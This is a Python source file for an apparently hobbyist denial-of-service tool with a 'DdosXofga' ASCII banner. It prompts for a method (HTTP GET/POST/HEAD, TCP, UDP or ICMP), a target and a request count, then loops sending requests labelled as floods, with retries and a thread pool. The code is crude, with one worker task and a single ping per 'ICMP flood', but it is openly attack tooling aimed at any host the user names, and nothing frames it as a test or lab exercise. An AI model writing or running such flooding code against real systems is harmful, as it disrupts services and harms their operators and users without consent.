from concurrent.futures import ThreadPoolExecutor
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
from icmplib import ping
import requests

def print_banner():
    banner = """
 /$$$$$$$        /$$                     /$$   /$$            /$$$$$$                   
| $$__  $$      | $$                    | $$  / $$           /$$__  $$                  
| $$  \ $$  /$$$$$$$  /$$$$$$   /$$$$$$$|  $$/ $$/  /$$$$$$ | $$  \__//$$$$$$   /$$$$$$ 
| $$  | $$ /$$__  $$ /$$__  $$ /$$_____/ \  $$$$/  /$$__  $$| $$$$   /$$__  $$ |____  $$
| $$  | $$| $$  | $$| $$  \ $$|  $$$$$$   >$$  $$ | $$  \ $$| $$_/  | $$  \ $$  /$$$$$$$
| $$  | $$| $$  | $$| $$  | $$ \____  $$ /$$/\  $$| $$  | $$| $$    | $$  | $$ /$$__  $$
| $$$$$$$/|  $$$$$$$|  $$$$$$/ /$$$$$$$/| $$  \ $$|  $$$$$$/| $$    |  $$$$$$$|  $$$$$$$
|_______/  \_______/ \______/ |_______/ |__/  |__/ \______/ |__/     \____  $$ \_______/
                                                                     /$$  \ $$          
                                                                    |  $$$$$$/          
                                                                     \______/           
    """
    print(banner)

def send_get_request(url):
    try:
        response = requests.get(url)
        print(f"GET request sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"GET request failed: {e}")

def send_post_request(url):
    try:
        response = requests.post(url, data={'key': 'value'})
        print(f"POST request sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"POST request failed: {e}")

def send_head_request(url):
    try:
        response = requests.head(url)
        print(f"HEAD request sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"HEAD request failed: {e}")

def tcp_flood(ip, port):
    try:
        with socket(AF_INET, SOCK_STREAM) as s:
            s.connect((ip, port))
            s.sendall(b'GET / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
        print(f"TCP flood request sent to {ip}:{port}")
    except Exception as e:
        print(f"TCP flood request failed: {e}")

def udp_flood(ip, port):
    try:
        with socket(AF_INET, SOCK_DGRAM) as s:
            s.sendto(b'Flood', (ip, port))
        print(f"UDP flood request sent to {ip}:{port}")
    except Exception as e:
        print(f"UDP flood request failed: {e}")

def icmp_flood(ip):
    try:
        response = ping(ip, timeout=1)
        print(f"ICMP flood request sent to {ip}")
    except Exception as e:
        print(f"ICMP flood request failed: {e}")

def run_flood(method, target, num_requests):
    if method == 'GET':
        for _ in range(num_requests):
            send_get_request(target)
    elif method == 'POST':
        for _ in range(num_requests):
            send_post_request(target)
    elif method == 'HEAD':
        for _ in range(num_requests):
            send_head_request(target)
    elif method == 'TCP':
        ip, port = target.split(':')
        for _ in range(num_requests):
            tcp_flood(ip, int(port))
    elif method == 'UDP':
        ip, port = target.split(':')
        for _ in range(num_requests):
            udp_flood(ip, int(port))
    elif method == 'ICMP':
        ip = target
        for _ in range(num_requests):
            icmp_flood(ip)
    else:
        print(f"Unknown method: {method}")

def try_flood(method, target, num_requests, max_retries=3):
    attempt = 0
    while attempt < max_retries:
        try:
            print(f"Attempt {attempt + 1} for {method} flooding on {target}.")
            run_flood(method, target, num_requests)
            print(f"Flooding completed for attempt {attempt + 1}.")
            break
        except Exception as e:
            print(f"Flooding failed on attempt {attempt + 1}: {e}")
            attempt += 1
            if attempt >= max_retries:
                print("Maaf, kamu sudah sampai batas percobaan.")
            else:
                print("Retrying...")

def main():
    print_banner()
    method = input("Enter the method (GET, POST, HEAD, TCP, UDP, ICMP): ").upper()
    target = input("Enter the target URL or IP:Port: ")
    num_requests = int(input("Enter the number of requests: "))

    print(f"Starting {method} flood on {target} with {num_requests} requests.")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(try_flood, method, target, num_requests)]
        for future in futures:
            try:
                future.result()
                print("Flooding process completed.")
            except Exception as e:
                print(f"Flooding process failed: {e}")

if __name__ == "__main__":
    main()